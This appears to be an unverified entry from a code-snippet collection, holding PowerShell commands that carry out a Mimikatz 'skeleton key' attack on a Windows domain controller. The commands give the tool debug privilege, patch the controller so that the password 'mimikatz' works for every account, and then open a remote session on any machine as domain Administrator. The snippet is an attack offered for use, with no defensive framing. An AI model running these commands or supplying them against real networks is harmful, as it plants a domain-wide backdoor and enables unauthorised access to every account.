---
id: 2c0fb41c-e4ab-4990-b3e8-6a6834de6cac
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:28.268749+00:00'
updated_at: '2023-04-10T20:37:25.394168+00:00'
---

# Code Snippet 2c0fb41c

**Language**: Powershell

```powershell
# Execute the skeleton key attack
mimikatz "privilege::debug" "misc::skeleton"
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>

# Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```
